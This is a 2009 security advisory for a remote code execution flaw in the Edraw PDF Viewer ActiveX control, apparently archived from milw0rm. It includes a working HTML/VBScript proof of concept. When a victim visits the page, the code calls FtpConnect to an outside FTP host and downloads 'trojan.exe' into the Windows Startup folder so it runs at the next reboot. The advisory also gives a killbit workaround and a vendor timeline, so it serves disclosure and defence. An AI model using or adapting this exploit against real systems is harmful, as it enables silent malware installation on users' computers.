@@ -1,0 +1,50 @@
+Edraw PDF Viewer Component ActiveX Remote code execution vulnerability
+
+By Jambalaya of Nevis Labs
+Date: 2009.06.16
+
+Vender:
+EdrawSoft
+
+Affected:
+Edraw PDF Viewer Component < 3.2.0.126
+*other version may also be affected
+
+Overview:
+"Edraw PDF Viewer Component is a light weight ActiveX Control which
+enables your application to display and interact with PDF files.It is
+identical to Adobe Reader program and adds high speed viewing of PDF
+documents to your applications easily." For more information, see the
+vendor's site found at the following link: http://www.ocxt.com
+
+Details:
+The specific flaws exists in pdfviewer.ocx ActiveX control.Succssfully
+exploiting this vulnerability allows attackers to execute arbitrary code
+on vulnerable installation. The vulnerability exists due to FtpConnect()
+function, which could download any file from remote FTP server and put
+on user's disk.Malicious user could download trojan and put into
+"startup" folder so that the trojan will run up when user's computer
+restart. Successful exploitation requires that the target user browse to
+a malicious web page.
+
+Proof of Concept:
+<html>
+<body>
+<BR><object classid="clsid:44A8091F-8F01-43B7-8CF7-4BBA71E61E04" id="target" width="67" height="50" codebase="http://www.ocxt.com/download/officeviewer.cab#6,0,612,1"></object>
+<BR><BR>
+<script language="vbscript">
+target.FtpConnect "ftp://192.168.220.201", "test", "tester"
+target.FtpDownloadFile "trojan.exe", "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\trojan.exe"
+target.FtpDisConnect 
+</script> 
+</body>
+</html>
+
+Workaround:
+Set a killbit for this ActiveX.
+
+Vendor Response:
+2009.06.16 Vendor notified via email
+2009.06.17 Vendor respond, and release patch
+
+# milw0rm.com [2009-06-18]
